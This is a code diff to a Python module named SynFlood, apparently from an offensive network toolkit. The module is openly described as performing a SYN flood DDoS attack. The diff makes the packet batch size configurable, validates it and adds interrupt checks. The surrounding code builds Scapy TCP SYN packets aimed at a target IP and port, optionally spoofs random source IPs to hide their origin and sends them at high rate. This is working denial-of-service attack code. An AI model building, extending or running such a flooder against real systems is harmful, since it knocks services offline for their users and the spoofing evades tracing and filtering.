@@ -47,7 +47,6 @@ class SynFlood(BaseModule):
     DESCRIPTION = "Perform a SYN Flood DDOS attack"
     REQUIRES_ROOT = True
 
-    BATCH_SIZE = 1000
     LOWER_PORT = 1024
     UPPER_PORT = 65535
 
@@ -67,7 +66,7 @@ class SynFlood(BaseModule):
         Adds module-specific arguments to the argument parser. This method is
         called by the Engine when setting up the CLI for this module. Defines
         arguments for packet count, interval between packets, target IP address,
-        target port, and optional source IP spoofing.
+        target port, batch size and optional source IP spoofing.
         Args:
             parser (argparse.ArgumentParser): The argument parser to which
                                             module-specific args are added.
@@ -118,6 +117,16 @@ class SynFlood(BaseModule):
             default=False,
             help="Provides a random source IP Addr for packets that are sent"
         )
+
+        parser.add_argument(
+            '-b',
+            '--batch-size',
+            type=int,
+            action='store',
+            dest='batch_size',
+            default=1000,
+            help="Number of packets per flood batch (Default=1000)"    
+        )
         
 
     def run(self, args: argparse.Namespace) -> None:
@@ -142,13 +151,13 @@ class SynFlood(BaseModule):
                     self.output.warn("Keyboard interrupted (CTRL+C)")
                     break
                 self._flood(args)
-                self._packets_sent += self.BATCH_SIZE
+                self._packets_sent += args.batch_size
                 time.sleep(args.interval)
         except Exception as e:
             self.output.error(f"{e}")
         finally:
             signal.signal(signal.SIGINT, signal.SIG_DFL)
-            msg = f"Packets sent: {self._packets_sent}"
+            msg = f"Approximate packets sent: {self._packets_sent:,}"
             self.output.success(msg)
 
     ############################################################################
@@ -186,6 +195,11 @@ class SynFlood(BaseModule):
             msg = f"The port must be from 1 to {self.UPPER_PORT}"
             self.output.error(msg)
             return False
+        
+        if args.batch_size <= 0:
+            msg = "The batch size must greater than zero"
+            self.output.error(msg)
+            return False        
 
         return True
     
@@ -199,8 +213,9 @@ class SynFlood(BaseModule):
         origin and prevent source-based filtering. When spoofing is disabled
         packets are sent with the attacker's real IP address as the source.
         Each packet includes an Ethernet layer for proper layer 2 framing
-        required by sendpfast(). Sends BATCH_SIZE packets per call achieving
-        approximately 2200 packets per second.
+        required by sendpfast(). Sends a user provided amount of packets via
+        '--batch-size' (default=1000) per call achieving approximately 2200 
+        packets per second.
         Args:
             args (argparse.Namespace): The parsed command-line arguments used
                                     to access target, port, and spoof_ip.
@@ -210,14 +225,20 @@ class SynFlood(BaseModule):
         pkts = list()
 
         if args.spoof_ip:
-            for _ in range(self.BATCH_SIZE):
+            for _ in range(args.batch_size):
+                if self._keyboard_interrupted:
+                    break
+
                 src_ip = self._random_ip()
                 src_port = self._random_port()
                 pkt = Ether()/IP(src=src_ip, dst=tgt_ip)
                 pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
                 pkts.append(pkt)
         else:
-            for _ in range(self.BATCH_SIZE):
+            for _ in range(args.batch_size):
+                if self._keyboard_interrupted:
+                    break
+
                 src_port = self._random_port()
                 pkt = Ether()/IP(dst=tgt_ip)
                 pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
